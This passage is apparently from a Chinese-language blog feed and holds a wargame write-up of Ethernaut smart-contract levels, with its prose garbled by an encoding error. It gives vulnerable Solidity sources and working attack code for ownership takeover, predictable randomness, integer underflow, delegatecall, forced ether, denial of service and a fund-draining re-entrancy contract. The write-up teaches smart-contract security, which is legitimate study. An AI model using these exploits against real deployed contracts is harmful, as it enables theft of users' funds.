&#125; &#125;&#125;contract son &#123; constructor() public&#123; jojo tmp = jojo(0xd86ed76112295a07c675974995b9805912282eb3); tmp.gift(); tmp.transfer(0xafFE1Eeea46Ec23a87C7894d90Aa714552468cAF,100); &#125;&#125;]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>Solidity</tag>
        <tag>Smart Contract</tag>
        <tag>æ•°å­—ç»æµŽäº‘å®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ethernaut -- Smart Contract]]></title>
    <url>%2F2019%2Fethernaut%2F</url>
    <content type="text"><![CDATA[å‰è¨€ 22 shop è¿™é¢˜è²Œä¼¼å·²ç»ä¸‹çº¿ï¼Œå˜¤å˜¤å˜¤å˜¤ ä»¥ä¸‹ wp éƒ½æ˜¯åŸºäºŽ 0.4.* ç‰ˆæœ¬çš„ è®°å½•ä¸€ä¸‹åˆšå­¦ä¹  Smart Contract åšé¢˜çš„å¹³å°çš„ WP ï¼ˆ2333å…¥é—¨çº§ï¼Œå¼€å¿ƒå°±å¥½ï½žï½žï½žï¼‰ï¼Œå¦‚æžœæ²¡æœ‰ä»»ä½•åŸºç¡€ï¼Œå¯ä»¥å‚è€ƒ CryptoZombies ç­‰æ•™ç¨‹ï¼Œä¸‹é¢æ˜¯é¢˜ç›®å¹³å°åœ°å€ï¼š https://ethernaut.openzeppelin.com/ Hello Ethernaut ç†Ÿæ‚‰å…³å¡æŒ‘æˆ˜çš„æ¨¡å¼ï¼Œä»¥åŠæ‰§è¡Œæ“ä½œçš„æ–¹å¼ï¼Œæ ¹æ®å…¶ä»‹ç»ä¸€æ­¥ä¸€æ­¥æ“ä½œå³å¯ ç”±äºŽç½‘ç»œä¸å¤ªç¨³å®šçš„åŽŸå› ï¼Œå¯ä»¥å¤šè¯•å‡ æ¬¡ï¼ŒæˆåŠŸçš„ç»“æžœèŠ±é‡Œèƒ¡å“¨çš„23333 FallbackRequire you claim ownership of the contract you reduce its balance to 0 Source1234567891011121314151617181920212223242526272829303132333435pragma solidity ^0.4.18;import 'zeppelin-solidity/contracts/ownership/Ownable.sol';import 'openzeppelin-solidity/contracts/math/SafeMath.sol';contract Fallback is Ownable &#123; using SafeMath for uint256; mapping(address =&gt; uint) public contributions; function Fallback() public &#123; contributions[msg.sender] = 1000 * (1 ether); &#125; function contribute() public payable &#123; require(msg.value &lt; 0.001 ether); contributions[msg.sender] = contributions[msg.sender].add(msg.value); if(contributions[msg.sender] &gt; contributions[owner]) &#123; owner = msg.sender; &#125; &#125; function getContribution() public view returns (uint) &#123; return contributions[msg.sender]; &#125; function withdraw() public onlyOwner &#123; owner.transfer(this.balance); &#125; function() payable public &#123; require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0); owner = msg.sender; &#125;&#125; Analyse åˆçº¦å¯ä»¥æœ‰ä¸€ä¸ªæœªå‘½åçš„å‡½æ•°ã€‚è¿™ä¸ªå‡½æ•°ä¸èƒ½æœ‰å‚æ•°ä¹Ÿä¸èƒ½æœ‰è¿”å›žå€¼ã€‚ å¦‚æžœåœ¨ä¸€ä¸ªåˆ°åˆçº¦çš„è°ƒç”¨ä¸­ï¼Œæ²¡æœ‰å…¶ä»–å‡½æ•°ä¸Žç»™å®šçš„å‡½æ•°æ ‡è¯†åŒ¹é…ï¼ˆæˆ–æ²¡æœ‰æä¾›è°ƒç”¨æ•°æ®ï¼‰ï¼Œé‚£ä¹ˆè¿™ä¸ªå‡½æ•°ï¼ˆ fallback å‡½æ•°ï¼‰ä¼šè¢«æ‰§è¡Œã€‚é™¤æ­¤ä¹‹å¤–ï¼Œæ¯å½“åˆçº¦æ”¶åˆ°ä»¥å¤ªå¸ï¼ˆæ²¡æœ‰ä»»ä½•æ•°æ®ï¼‰ï¼Œè¿™ä¸ªå‡½æ•°å°±ä¼šæ‰§è¡Œã€‚æ­¤å¤–ï¼Œä¸ºäº†æŽ¥æ”¶ä»¥å¤ªå¸ï¼Œ fallback å‡½æ•°å¿…é¡»æ ‡è®°ä¸º payable ã€‚ å¾ˆæ˜Žæ˜¾æˆ‘ä»¬å¦‚æžœé€šè¿‡åå¤è°ƒç”¨ contribute æ¥è§¦å‘ owner ä¸çŽ°å®žï¼Œå› ä¸ºæˆ‘ä»¬æ¯æ¬¡æœ€å¤šå‘åˆçº¦è´¡çŒ®ä¸å¤§äºŽ 0.001 ether ï¼Œè€Œè¦è¶…è¿‡ owner éœ€è¦ 1000 ether ï¼ˆæž„é€ å‡½æ•°èµ‹äºˆ owner çš„ï¼‰ã€‚ä½†æˆ‘ä»¬æƒŠå–œåœ°å‘çŽ° fallback å‡½æ•°åŒæ ·å¯ä»¥æ”¹å˜ owner çš„å€¼ï¼Œé‚£ä¹ˆå¯¹åº”çš„æ“ä½œå°±éžå¸¸æ¸…æ™°äº†ï¼š è°ƒç”¨åˆçº¦çš„ contribute ä½¿å¾—åˆçº¦ä¸­æˆ‘ä»¬è´¦æˆ·å¯¹åº”çš„ balance å¤§äºŽ 0 è§¦å‘ fallback å‡½æ•°ä½¿å¾—åˆçº¦å¯¹åº”çš„ owner å˜æˆæˆ‘ä»¬ è°ƒç”¨ withdraw å‡½æ•°æ¸…ç©º balance Solution12345678// step 1await contract.contribute(&#123;value: 1&#125;);// step 2ï¼Œä½¿ç”¨ sendTransaction å‡½æ•°è§¦å‘ fallback å‡½æ•°æ‰§è¡Œawait contract.sendTransaction(&#123;value: 1&#125;);// step 3await contract.withdraw();// æ­¤æ—¶è°ƒç”¨ owner å‡½æ•°å¯ä»¥ç¡®è®¤åˆçº¦çš„ owner æ˜¯å¦å·²ç»å˜æˆäº†æˆ‘ä»¬æ‰€å¯¹åº”çš„åœ°å€äº†await contract.owner(); FalloutRequire Claim ownership of the contract below to complete this level. Source123456789101112131415161718192021222324252627282930313233pragma solidity ^0.4.18;import 'zeppelin-solidity/contracts/ownership/Ownable.sol';import 'openzeppelin-solidity/contracts/math/SafeMath.sol';contract Fallout is Ownable &#123; using SafeMath for uint256; mapping (address =&gt; uint) allocations; /* constructor */ function Fal1out() public payable &#123; owner = msg.sender; allocations[owner] = msg.value; &#125; function allocate() public payable &#123; allocations[msg.sender] = allocations[msg.sender].add(msg.value); &#125; function sendAllocation(address allocator) public &#123; require(allocations[allocator] &gt; 0); allocator.transfer(allocations[allocator]); &#125; function collectAllocations() public onlyOwner &#123; msg.sender.transfer(this.balance); &#125; function allocatorBalance(address allocator) public view returns (uint) &#123; return allocations[allocator]; &#125;&#125; Analyse æˆ‘ä»¬å¯ä»¥å‘çŽ°ä¸€ä¸ªå¾ˆæ˜Žæ˜¾çš„é—®é¢˜ï¼Œç†è®ºä¸Šåº”è¯¥å†™æˆ Fallout çš„æž„é€ å‡½æ•°è¢«å†™æˆäº† Fal1out ï¼Œé‚£ä¹ˆè¯¥å‡½æ•°å°±ä¸æ˜¯æž„é€ å‡½æ•°ï¼Œæ„å‘³ç€è¯¥å‡½æ•°å¯ä»¥è¢«æˆ‘ä»¬è°ƒç”¨ï¼ˆæˆ‘ä»¬æ— æ³•è°ƒç”¨æž„é€ å‡½æ•°ï¼‰ã€‚ Solution1234// è°ƒç”¨è¯¥å‡½æ•°ï¼Œä¿®æ”¹ ownerawait contract.Fal1out();// å¯ä»¥ç¡®è®¤æ˜¯å¦ä¿®æ”¹æˆåŠŸawait contract.owner(); Coin FlipRequire This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you&#39;ll need to use your psychic abilities to guess the correct outcome 10 times in a row. Source1234567891011121314151617181920212223242526272829303132333435pragma solidity ^0.4.18;import 'openzeppelin-solidity/contracts/math/SafeMath.sol';contract CoinFlip &#123; using SafeMath for uint256; uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; function CoinFlip() public &#123; consecutiveWins = 0; &#125; function flip(bool _guess) public returns (bool) &#123; uint256 blockValue = uint256(block.blockhash(block.number.sub(1))); if (lastHash == blockValue) &#123; revert(); &#125; lastHash = blockValue; uint256 coinFlip = blockValue.div(FACTOR); bool side = coinFlip == 1 ? true : false; if (side == _guess) &#123; consecutiveWins++; return true; &#125; else &#123; consecutiveWins = 0; return false; &#125; &#125;&#125; Analyse ä»£ç å¤„ç†æµç¨‹ä¸ºï¼š èŽ·å¾—ä¸Šä¸€å—çš„ hash å€¼ åˆ¤æ–­ä¸Žä¹‹å‰ä¿å­˜çš„ hash å€¼æ˜¯å¦ç›¸ç­‰ï¼Œç›¸ç­‰åˆ™ä¼šé€€ æ ¹æ® blockValue/FACTOR çš„å€¼åˆ¤æ–­ä¸ºæ­£æˆ–è´Ÿï¼Œå³é€šè¿‡ hash çš„é¦–ä½åˆ¤æ–­ ä»¥å¤ªåŠåŒºå—é“¾ä¸Šçš„æ‰€æœ‰äº¤æ˜“éƒ½æ˜¯ç¡®å®šæ€§çš„çŠ¶æ€è½¬æ¢æ“ä½œï¼Œæ¯ç¬”äº¤æ˜“éƒ½ä¼šæ”¹å˜ä»¥å¤ªåŠç”Ÿæ€ç³»ç»Ÿçš„å…¨çƒçŠ¶æ€ï¼Œå¹¶ä¸”æ˜¯ä»¥ä¸€ç§å¯è®¡ç®—çš„æ–¹å¼è¿›è¡Œï¼Œè¿™æ„å‘³ç€å…¶æ²¡æœ‰ä»»ä½•çš„ä¸ç¡®å®šæ€§ã€‚æ‰€ä»¥åœ¨åŒºå—é“¾ç”Ÿæ€ç³»ç»Ÿå†…ï¼Œä¸å­˜åœ¨ç†µæˆ–éšæœºæ€§çš„æ¥æºã€‚å¦‚æžœä½¿ç”¨å¯ä»¥è¢«æŒ–çŸ¿çš„çŸ¿å·¥æ‰€æŽ§åˆ¶çš„å˜é‡ï¼Œå¦‚åŒºå—å“ˆå¸Œå€¼ï¼Œæ—¶é—´æˆ³ï¼ŒåŒºå—é«˜ä½Žæˆ–æ˜¯ Gas ä¸Šé™ç­‰ä½œä¸ºéšæœºæ•°çš„ç†µæºï¼Œäº§ç”Ÿçš„éšæœºæ•°å¹¶ä¸å®‰å…¨ã€‚ Solution12345678910111213141516171819202122232425262728293031323334353637383940414243444546pragma solidity ^0.4.18;contract CoinFlip &#123; uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; function CoinFlip() public &#123; consecutiveWins = 0; &#125; function flip(bool _guess) public returns (bool) &#123; uint256 blockValue = uint256(block.blockhash(block.number-1)); if (lastHash == blockValue) &#123; revert(); &#125; lastHash = blockValue; uint256 coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ? true : false; if (side == _guess) &#123; consecutiveWins++; return true; &#125; else &#123; consecutiveWins = 0; return false; &#125; &#125;&#125;contract hack&#123; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; address instance_address = 0x3205e72483e9568c0959384f9c13672c3566c4a1; CoinFlip c = CoinFlip(instance_address); function exploit() public &#123; uint256 blockValue = uint256(block.blockhash(block.number-1)); uint256 coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ? true : false; c.flip(side); &#125;&#125; è°ƒç”¨ 10 æ¬¡ exploit() å³å¯ TelephoneRequire Claim ownship of the contract below to complete this level Source12345678910111213141516pragma solidity ^0.4.18;contract Telephone &#123; address public owner; function Telephone() public &#123; owner = msg.sender; &#125; function changeOwner(address _owner) public &#123; if (tx.origin != msg.sender) &#123; owner = _owner; &#125; &#125;&#125; Analyse è¿™é‡ŒåŒºåˆ†ä¸€ä¸‹ tx.origin å’Œ msg.sender ï¼Œmsg.senderæ˜¯å‡½æ•°çš„ç›´æŽ¥è°ƒç”¨æ–¹ï¼Œåœ¨ç”¨æˆ·æ‰‹åŠ¨è°ƒç”¨è¯¥å‡½æ•°æ—¶æ˜¯å‘èµ·äº¤æ˜“çš„è´¦æˆ·åœ°å€ï¼Œä½†ä¹Ÿå¯ä»¥æ˜¯è°ƒç”¨è¯¥å‡½æ•°çš„ä¸€ä¸ªæ™ºèƒ½åˆçº¦çš„åœ°å€ã€‚è€Œ tx.origin åˆ™å¿…ç„¶æ˜¯è¿™ä¸ªäº¤æ˜“çš„åŽŸå§‹å‘èµ·æ–¹ï¼Œæ— è®ºä¸­é—´æœ‰å¤šå°‘æ¬¡åˆçº¦å†…/è·¨åˆçº¦å‡½æ•°è°ƒç”¨ï¼Œè€Œä¸”ä¸€å®šæ˜¯è´¦æˆ·åœ°å€è€Œä¸æ˜¯åˆçº¦åœ°å€ã€‚ ç»™å®šè¿™æ ·ä¸€ä¸ªåœºæ™¯å¦‚ï¼šç”¨æˆ·é€šè¿‡ åˆçº¦A è°ƒ åˆçº¦B ï¼Œæ­¤æ—¶ï¼š å¯¹äºŽ åˆçº¦A ï¼štx.originå’Œmsg.senderéƒ½æ˜¯ç”¨æˆ· å¯¹äºŽ åˆçº¦B ï¼štx.originæ˜¯ç”¨æˆ·ï¼Œmsg.senderæ˜¯ åˆçº¦Aæ‰€ä»¥ï¼Œè¿™é‡Œéƒ¨ç½²ä¸€ä¸ªç¬¬ä¸‰æ–¹åˆçº¦å³å¯ã€‚ Solution12345678910111213141516171819202122232425pragma solidity ^0.4.18;contract Telephone &#123; address public owner; function Telephone() public &#123; owner = msg.sender; &#125; function changeOwner(address _owner) public &#123; if (tx.origin != msg.sender) &#123; owner = _owner; &#125; &#125;&#125;contract hack &#123; address instance_address = 0x852cd04ec66730198e709eb4261d3fa926bc92d8; Telephone t = Telephone(instance_address); function exploit() public &#123; t.changeOwner(msg.sender); &#125;&#125; æ”»å‡»è€…è°ƒç”¨ exploit() å³å¯ TokenRequire The goal of this level is for you to hack the basic token contract below. You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens. Source12345678910111213141516171819202122pragma solidity ^0.4.18;contract Token &#123; mapping(address =&gt; uint) balances; uint public totalSupply; function Token(uint _initialSupply) public &#123; balances[msg.sender] = totalSupply = _initialSupply; &#125; function transfer(address _to, uint _value) public returns (bool) &#123; require(balances[msg.sender] - _value &gt;= 0); balances[msg.sender] -= _value; balances[_to] += _value; return true; &#125; function balanceOf(address _owner) public view returns (uint balance) &#123; return balances[_owner]; &#125;&#125; Analyse ç»å…¸çš„æ•´æ•°æº¢å‡ºé—®é¢˜ï¼Œåœ¨ transfer() å‡½æ•°ç¬¬ä¸€è¡Œ require é‡Œï¼Œè¿™é‡Œçš„ balances å’Œ value éƒ½æ˜¯ uint ã€‚æ­¤æ—¶ balances ä¸º 20 ï¼Œä»¤ value=21 ï¼Œäº§ç”Ÿä¸‹æº¢ï¼Œä»Žè€Œç»•è¿‡éªŒè¯ï¼Œå¹¶è½¬å‡ºä¸€ç¬”å¾ˆå¤§çš„é‡‘é¢ã€‚ Solution1234// è½¬ç»™è°ä¸é‡è¦ï¼Œå…³é”®æ˜¯åˆ©ç”¨ 20-21 è§¦å‘æ•´æ•°ä¸‹æº¢await contract.transfer(0, 21);// å¯ä»¥çœ‹ä¸€ä¸‹è‡ªå·±çŽ°åœ¨çš„ token æœ‰å¤šå°‘ï¼ˆéžå¸¸ä¹‹å¤šï¼‰await contract.balanceOf(player); ä½†æ˜¯ä¹Ÿå¹¶éžæ²¡æœ‰åŠžæ³•æ¥å¤„ç†è¯¥é—®é¢˜ï¼Œæœ€ç®€å•çš„å¤„ç†æ˜¯åœ¨æ¯ä¸€æ¬¡æ•°å­¦è¿ç®—æ—¶è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚ a=a+b ï¼›å°±å¯ä»¥å†™æˆ if(a+b&gt;a) a=a+b; ã€‚é¢˜ç›®å»ºè®®çš„å¦ä¸€ç§è§£å†³æ–¹æ¡ˆåˆ™æ˜¯ä½¿ç”¨ OpenZeppelinå›¢é˜Ÿ å¼€å‘çš„ SafeMathåº“ ï¼Œå¦‚æžœæ•´æ•°æº¢å‡ºæ¼æ´žå‘ç”Ÿæ—¶ï¼Œå‡½æ•°å°†è¿›è¡Œå›žé€€æ“ä½œï¼Œæ­¤æ—¶åŠ æ³•æ“ä½œå¯ä»¥å†™ä½œè¿™æ ·ï¼ša=a.add(b); DelegationRequire claim ownership of the instance Source12345678910111213141516171819202122232425262728293031pragma solidity ^0.4.18;contract Delegate &#123; address public owner; function Delegate(address _owner) public &#123; owner = _owner; &#125; function pwn() public &#123; owner = msg.sender; &#125;&#125;contract Delegation &#123; address public owner; Delegate delegate; function Delegation(address _delegateAddress) public &#123; delegate = Delegate(_delegateAddress); owner = msg.sender; &#125; function() public &#123; if(delegate.delegatecall(msg.data)) &#123; this; &#125; &#125;&#125; Analyse æˆ‘ä»¬çœ‹ä¸‹ delegatecall çš„æ–‡æ¡£ There exists a special variant of a message call, named delegatecall which is identical to a message call apart from the fact that the code at the target address is executed in the context of the calling contract and msg.sender and msg.value do not change their values. è€ƒç‚¹ä¸€ è€ƒç‚¹ä¸€åœ¨äºŽ Solidity æ”¯æŒä¸¤ç§åº•å±‚è°ƒç”¨æ–¹å¼ call å’Œ delegatecall call å¤–éƒ¨è°ƒç”¨æ—¶ï¼Œä¸Šä¸‹æ–‡æ˜¯å¤–éƒ¨åˆçº¦ delegatecall å¤–éƒ¨è°ƒç”¨æ—¶ï¼Œä¸Šä¸‹æ–‡æ˜¯è°ƒç”¨åˆçº¦ æ‰€ä»¥ delegate.delegatecall(msg.data) å…¶å®žè°ƒç”¨çš„æ˜¯ delegate è‡ªèº«çš„ msg.data è€ƒç‚¹äºŒ ç†Ÿæ‚‰ raw æ ¼å¼çš„äº¤æ˜“çš„ data çš„ä¼šçŸ¥é“ï¼šdata å¤´4ä¸ª byte æ˜¯è¢«è°ƒç”¨æ–¹æ³•çš„ç­¾åå“ˆå¸Œï¼Œå³ bytes4(keccak256(&quot;func&quot;)) , remix é‡Œè°ƒç”¨å‡½æ•°ï¼Œå®žé™…æ˜¯å‘åˆçº¦è´¦æˆ·åœ°å€å‘é€äº†( msg.data[0:4] == å‡½æ•°ç­¾åå“ˆå¸Œ )çš„ä¸€ç¬”äº¤æ˜“ æ‰€ä»¥æˆ‘ä»¬åªéœ€è°ƒç”¨ Delegation çš„ fallback çš„åŒæ—¶åœ¨ msg.data æ”¾å…¥ pwn å‡½æ•°çš„ç­¾åå³å¯ è€ƒç‚¹ä¸‰ è¿™é‡Œå…¶å®žä¸»è¦æ€è·¯å°±æ˜¯ fallback çš„è§¦å‘æ¡ä»¶ï¼š ä¸€æ˜¯å¦‚æžœåˆçº¦åœ¨è¢«è°ƒç”¨çš„æ—¶å€™ï¼Œæ‰¾ä¸åˆ°å¯¹æ–¹è°ƒç”¨çš„å‡½æ•°ï¼Œå°±ä¼šè‡ªåŠ¨è°ƒç”¨ fallback å‡½æ•° äºŒæ˜¯åªè¦æ˜¯åˆçº¦æ”¶åˆ°åˆ«äººå‘é€çš„ Ether ä¸”æ²¡æœ‰æ•°æ®ï¼Œå°±ä¼šå°è¯•æ‰§è¡Œ fallback å‡½æ•°ï¼Œæ­¤æ—¶ fallback éœ€è¦å¸¦æœ‰ payable æ ‡è®°ï¼Œå¦åˆ™ï¼Œåˆçº¦å°±ä¼šæ‹’ç»è¿™ä¸ª Ether ç»¼ä¸Šï¼Œæˆ‘ä»¬åªéœ€è°ƒç”¨ Delegation çš„ å‡pwn() å³å¯ï¼Œè¿™æ ·å°±ä¼šè§¦å‘ Delegation çš„ fallback ï¼Œè¿™æ · pwn çš„å‡½æ•°ç­¾åå“ˆå¸Œå°±ä¼šæ”¾åœ¨ msg.data[0:4] äº†ï¼Œè¿™æ ·å°±ä¼šåªéœ€ delegate çš„ pwn() æŠŠ owner å˜æˆè‡ªå·± Solution web3 ä¸­ sha3 å°±æ˜¯ keccak256 ForceRequire make the balance of the contract greater than zero Source1234567891011pragma solidity ^0.4.18;contract Force &#123;/* MEOW ? /\_/\ / ____/ o o \ /~____ =Ã¸= / (______)__m_m)*/&#125; Analyse éªšæ“ä½œï¼Œ selfdestruct è‡ªæ¯åˆçº¦å¼ºè½¬ æ‰€ä»¥åªéœ€è¦å†éƒ¨ç½²ä¸€ä¸ªåˆçº¦ï¼Œæ‰“ä¸€ç‚¹é’±ï¼Œç„¶åŽè‡ªæ¯æŠŠåˆçº¦é‡‘é¢è½¬ç»™ç›®æ ‡åˆçº¦å³å¯ Solution1234567891011121314pragma solidity ^0.4.18; contract Force &#123;&#125;contract hack &#123; address instance_address = 0xe0a165650f7b04bde4fda5845d41aaf947703dd2; Force target = Force(instance_address); function hack() payable &#123;&#125; function exploit() payable public &#123; selfdestruct(target); &#125;&#125; éƒ¨ç½² hack çš„æ—¶å€™è½¬ä¸€ç‚¹é’±ï¼Œç„¶åŽæ‰§è¡Œ exploit() å³å¯ VaultRequire Unlock the vault to pass the level! Source1234567891011121314151617pragma solidity ^0.4.18;contract Vault &#123; bool public locked; bytes32 private password; function Vault(bytes32 _password) public &#123; locked = true; password = _password; &#125; function unlock(bytes32 _password) public &#123; if (password == _password) &#123; locked = false; &#125; &#125;&#125; Analyse é€šå…³æ¡ä»¶æ˜¯ locked = false è€ƒç‚¹å…³é”®æ˜¯åŒºå—é“¾ä¸Šçš„æ‰€æœ‰ä¿¡æ¯æ˜¯å…¬å¼€çš„ å¯ä»¥ç”¨ web3 çš„ getStorageAt æ¥è®¿é—®åˆçº¦é‡Œå˜é‡çš„å€¼ Solution KingRequire When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation. Source123456789101112131415161718192021pragma solidity ^0.4.18;import 'zeppelin-solidity/contracts/ownership/Ownable.sol';contract King is Ownable &#123; address public king; uint public prize; function King() public payable &#123; king = msg.sender; prize = msg.value; &#125; function() external payable &#123; require(msg.value &gt;= prize || msg.sender == owner); king.transfer(msg.value); king = msg.sender; prize = msg.value; &#125;&#125; Analyse ä»£ç é€»è¾‘å¾ˆç®€å•ï¼Œè°ç»™çš„é’±å¤šè°å°±èƒ½æˆä¸º King ï¼Œå¹¶ä¸”å°†å‰ä»» King çš„é’±å½’è¿˜ã€‚å½“æäº¤ instance æ—¶ï¼Œé¢˜ç›®ä¼šé‡æ–°å¤ºå›ž King çš„ä½ç½®ï¼Œéœ€è¦é˜»æ­¢å…¶ä»–äººæˆä¸º Kingæ–¹å¯é€šå…³ é¦–å…ˆçœ‹ä¸€ä¸‹ Solidity ä¸­å‡ ç§è½¬è´¦æ–¹å¼ï¼š address.transfer()å½“å‘é€å¤±è´¥æ—¶ä¼š throw ï¼›å›žæ»šçŠ¶æ€åªä¼šä¼ é€’éƒ¨åˆ† Gas ä¾›è°ƒç”¨ï¼Œé˜²æ­¢é‡å…¥ address.send()å½“å‘é€å¤±è´¥æ—¶ä¼šè¿”å›ž falseåªä¼šä¼ é€’éƒ¨åˆ† Gas ä¾›è°ƒç”¨ï¼Œé˜²æ­¢é‡å…¥ address.call.value()()å½“å‘é€å¤±è´¥æ—¶ä¼šè¿”å›ž falseä¼ é€’æ‰€æœ‰å¯ç”¨ Gas ä¾›è°ƒç”¨ï¼Œä¸èƒ½æœ‰æ•ˆé˜²æ­¢é‡å…¥ å›žå¤´çœ‹ä¸‹ä»£ç ï¼Œå½“æˆ‘ä»¬æˆä¸º King åŽï¼Œå¦‚æžœæœ‰äººå‡ºä»·æ¯”æˆ‘ä»¬é«˜ï¼Œä¼šé¦–å…ˆæŠŠé’±é€€å›žç»™æˆ‘ä»¬ï¼Œä½¿ç”¨çš„æ˜¯ transfer ï¼Œä¸Šé¢æåˆ°å½“ transfer è°ƒç”¨å¤±è´¥æ—¶ä¼šå›žæ»šçŠ¶æ€ï¼Œé‚£ä¹ˆå¦‚æžœåˆçº¦åœ¨é€€é’±è¿™ä¸€æ­¥éª¤ä¸€ç›´è°ƒç”¨å¤±è´¥çš„è¯ï¼Œé‚£ä¹ˆä»£ç å°†æ— æ³•ç»§ç»­å‘ä¸‹è¿è¡Œï¼Œå…¶ä»–äººä¹Ÿå°±æ— æ³•æˆä¸ºæ–°çš„ Kingï¼Œè¾¾åˆ°æ”»å‡»æ•ˆæžœ Solution é¦–å…ˆæŸ¥çœ‹ä¸€ä¸‹å½“å‰æœ€é«˜å‡ºä»· 12await fromWei((await contract.prize()).toNumber())// 1 eth éƒ¨ç½²ä¸€ä¸ªæ–°çš„åˆçº¦ï¼Œå½“æ”¶åˆ°è½¬è´¦æ—¶ä¸»åŠ¨æŠ›å‡ºé”™è¯¯ 123456789101112131415pragma solidity ^0.4.18;contract Attack &#123; address instance_address = 0xa4d38a8591b7e16bea4fe0f64cd77ee7243f1cdc; function Attack() payable&#123;&#125; function hack() public &#123; instance_address.call.value(1.1 ether)(); &#125; function () public &#123; throw; &#125;&#125; è°ƒç”¨ hack() å³å¯ï¼Œå¯ä»¥çœ‹åˆ°è°ƒç”¨ hack() åŽæˆä¸ºäº†æ–°çš„ King ï¼Œè€Œä¸” Submit innstance åŽï¼Œä»ç„¶æ˜¯ King Re-entrancyRequire The goal of this level is for you to steal all the funds from the contract Source12345678910111213141516171819202122232425262728pragma solidity ^0.4.18;import 'openzeppelin-solidity/contracts/math/SafeMath.sol';contract Reentrance &#123; using SafeMath for uint256; mapping(address =&gt; uint) public balances; function donate(address _to) public payable &#123; balances[_to] = balances[_to].add(msg.value); &#125; function balanceOf(address _who) public view returns (uint balance) &#123; return balances[_who]; &#125; function withdraw(uint _amount) public &#123; if(balances[msg.sender] &gt;= _amount) &#123; if(msg.sender.call.value(_amount)()) &#123; _amount; &#125; balances[msg.sender] -= _amount; &#125; &#125; function() public payable &#123;&#125;&#125; Analyse DASP æŽ’ç¬¬ä¸€çš„é‡å…¥æ¼æ´žï¼Œä¹Ÿæ˜¯è‘—åçš„ DAO äº‹ä»¶é‡Œç”¨åˆ°çš„æ–¹æ³• æ¼æ´žä¸»è¦åœ¨äºŽ withdraw() å‡½æ•°ï¼Œåˆçº¦åœ¨è¿›è¡Œæå¸æ—¶ï¼Œä½¿ç”¨ require ä¾æ¬¡åˆ¤æ–­æå¸è´¦æˆ·æ˜¯å¦æ‹¥æœ‰ç›¸åº”çš„èµ„äº§ï¼ŒéšåŽä½¿ç”¨ msg.sender.call.value(amount) æ¥å‘é€ Ether ï¼Œå¤„ç†å®ŒæˆåŽç›¸åº”ä¿®æ”¹ç”¨æˆ·èµ„äº§æ•°æ® åœ¨æå¸çš„è¿‡ç¨‹ä¸­ï¼Œå­˜åœ¨ä¸€ä¸ªé€’å½’ withdraw çš„é—®é¢˜ï¼ˆå› ä¸º -=_amount åœ¨è½¬è´¦ä¹‹åŽï¼‰ï¼Œæ”»å‡»è€…å¯ä»¥éƒ¨ç½²ä¸€ä¸ªåŒ…å«æ¶æ„é€’å½’è°ƒç”¨çš„åˆçº¦å°†å…¬å…±é’±åŒ…åˆçº¦é‡Œçš„ Ether å…¨éƒ¨æå‡º å…¶ä¸­ï¼Œè½¬è´¦ä½¿ç”¨çš„æ˜¯ address.call.value()() å‡½æ•°ï¼Œä¼ é€’äº†æ‰€æœ‰å¯ç”¨ gas ä¾›è°ƒç”¨ï¼Œæ˜¯å¯ä»¥æˆåŠŸæ‰§è¡Œé€’å½’çš„å‰ææ¡ä»¶ Solution æŸ¥çœ‹é¢˜ç›®è´¦æˆ·ä½™é¢ä¿¡æ¯ï¼š Reentrance åˆçº¦ä½™é¢ä¸º 1 eth balances[address(Attacker)] = 0 æ‰€ä»¥éƒ¨ç½² Attacker åˆçº¦æ—¶ï¼Œå¯ä»¥ç»™ Attacker åˆçº¦å…ˆè½¬ 1 eth ï¼Œç„¶åŽ donate 1 eth ï¼Œè¿™æ ·çš„è¯ Reentrance åˆçº¦ä½™é¢å°±æ˜¯ 2 eth äº†ï¼Œbalances[address(Attacker)] å°±æ˜¯ 1 eth ï¼Œç„¶åŽæ¯æ¬¡ withdraw 1 ethï¼Œè¿™æ ·çš„è¯ï¼Œé‡å…¥ 2 æ¬¡å°±èƒ½å°†é’±å…¨éƒ¨è½¬å‡º 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960pragma solidity ^0.4.19;contract Reentrance &#123; mapping(address =&gt; uint) public balances; function donate(address _to) public payable &#123; balances[_to] += msg.value; &#125; function balanceOf(address _who) public view returns (uint balance) &#123; return balances[_who]; &#125; function withdraw(uint _amount) public &#123; if(balances[msg.sender] &gt;= _amount) &#123; if(msg.sender.call.value(_amount)()) &#123; _amount; &#125; balances[msg.sender] -= _amount; &#125; &#125; function() public payable &#123;&#125;&#125;contract Attacker&#123; address instance_address = 0x54426463ef0ff0c720e9947f79ab6a770fda34f4; Reentrance target = Reentrance(instance_address); uint have_withdraw = 0; function Attacker() payable &#123;&#125; function get_balance() public view returns (uint)&#123; return target.balanceOf(this); &#125; function get_balance_ins() public view returns (uint)&#123; return instance_address.balance; &#125; function get_balance_my() public view returns (uint)&#123; return address(this).balance; &#125; function donate() public payable&#123; target.donate.value(1 ether)(this); &#125; function() payable&#123; if (have_withdraw == 0 &amp;&amp; msg.sender == instance_address)&#123; have_withdraw = 1; target.withdraw(1 ether); &#125; &#125; function hack()&#123; target.withdraw(1 ether); &#125;&#125; åˆçº¦åˆšéƒ¨ç½²å¥½ä½™é¢å¦‚ä¸‹ è°ƒç”¨ Attacker çš„ donate() è°ƒç”¨ hack() è¿›è¡Œé‡å…¥æ”»å‡» 2 æ¬¡ï¼Œå¯ä»¥çœ‹åˆ° Reentrance åˆçº¦ä½™é¢å˜ä¸º 0 ï¼Œè€Œ balances[address(Attacker)] = 1 - 2 ï¼Œç”±äºŽæ˜¯ uint256 ç±»åž‹ï¼Œæ‰€ä»¥ä¸‹æº¢å˜æˆäº† uint256 ç±»åž‹æœ€å¤§å€¼ï¼Œæ”»å‡»æˆåŠŸ ElevatorRequire 